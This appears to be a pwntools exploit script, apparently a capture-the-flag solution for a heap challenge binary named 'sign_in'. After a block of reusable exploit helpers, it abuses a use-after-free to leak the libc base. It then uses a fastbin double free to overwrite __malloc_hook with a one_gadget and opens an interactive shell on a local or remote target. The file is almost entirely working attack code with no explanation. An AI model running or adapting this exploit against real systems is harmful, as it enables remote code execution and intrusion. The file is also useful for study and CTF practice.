#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/14 12:02:09
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess, warnings, os

def ret2libc(addr,func,binary=null):
    libc         = LibcSearcher(func,addr)               if binary == null else binary
    libc.address = addr - libc.dump(func)                if binary == null else addr-libc.sym[func]
    system       = libc.address+libc.dump('system')      if binary == null else libc.sym['system']
    binsh        = libc.address+libc.dump('str_bin_sh')  if binary == null else next(libc.search(b'/bin/sh'))
    leak('libc_base',libc.address)
    leak('system',system)
    leak('binsh',binsh)
    return(system,binsh)

def hack(pwn):
    global io,binary,libc
    times = 0
    while True:
        try:
            times += 1
            clear()
            info(f'time --> {times}')
            pwn()
        except:
            io.close()
            io = proce(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def init(binary):
    global arglen, elf, path , libc, context, io
    arglen = len(sys.argv)
    warnings.filterwarnings('ignore')
    context.terminal = ['gnome-terminal','-x', 'bash','-c']
    elf = ELF(binary)
    path = libcpath(binary)
    libc = ELF(path)
    libc.path = path
    context.arch = elfbit(binary)
    io = proce(binary,path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

s           =       lambda data                       : io.send(data)
sa          =       lambda rv,data                    : io.sendafter(rv,data)
sl          =       lambda data                       : io.sendline(data)
sla         =       lambda rv,data                    : io.sendlineafter(rv,data)
r           =       lambda num                        : io.recv(num)
rl          =       lambda keepends=True              : io.recvline(keepends)
ru          =       lambda data,drop=True,time=null   : io.recvuntil(data,drop) if time == null else io.recvuntil(data,drop,time)
ia          =       lambda                            : io.interactive()
l32         =       lambda                            : u32(ru(b'\xf7',False)[-4:].ljust(4,b'\x00'))
l64         =       lambda                            : u64(ru(b'\x7f',False)[-6:].ljust(8,b'\x00'))
uu32        =       lambda data                       : u32(data.ljust(4,b'\x00'))
uu64        =       lambda data                       : u64(data.ljust(8,b'\x00'))
i16         =       lambda data                       : int(data,16)
leak        =       lambda name,addr                  : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
info        =       lambda data                       : log.info(f'\033[36m{data}\033[0m')
pau         =       lambda                            : pause() if DEBUG else null
dbg         =       lambda point=null                 : (gdb.attach(io) if point == null else gdb.attach(io,f'b *{point}')) if DEBUG else null
og          =       lambda binary                     : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg          =       lambda binary,only,grep           : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc     =       lambda leak,func                  : leak - libc.sym[func]
elfbit      =       lambda binary                     : 'i386' if subprocess.check_output(['file',binary]).decode().split(' ')[2] == '32-bit' else 'amd64'
libcpath    =       lambda binary                     : subprocess.check_output(['ldd',binary]).decode().replace('	', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep libc*.so'],shell=True).decode().strip('\n').split('\n')[0]
proce       =       lambda binary,libc=null           : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})
clear       =       lambda                            : os.system('clear')

# context.log_level='debug'
DEBUG  = 1
GLIBC  = 1
binary = './sign_in'
init(binary)

def cmd(index):
    sla(":",str(index))

def add(size,name,message):
    cmd(1)
    sla("ize of the game's name: ",str(size))
    sa("name:",name)
    sla("message",message)

# uafree
def free(index):
    cmd(3)
    sla("index",str(index))

def show():
    cmd(2)

add(0x88,b'\x01'*0x80+p64(0)+p64(0x21),b'')           # 0
add(0x28,b'\x01'*0x80+p64(0)+p64(0x21),b'') 

free(0)
free(1)

add(0x88,b'\x01'*0x80+p64(0)+p64(0x21),b'') 
free(0)

show()
libc.address = l64() - (0x7fd97ccdfb78 - 0x7fd97c91c000)
leak("libc_base",libc.address)

add(0x68,'a','a')
add(0x68,'a','a')
free(3)
free(4)
free(3)

add(0x68,p64(libc.sym['__malloc_hook']-0x23),b"b")
add(0x68,'a','a')
add(0x68,'a','a')
payload = b"a"*11 + p64(og(libc.path)[3]+libc.address) + p64(libc.sym["realloc"] + 4)
add(0x68,payload,b"a")
# dbg()

cmd(1)

ia()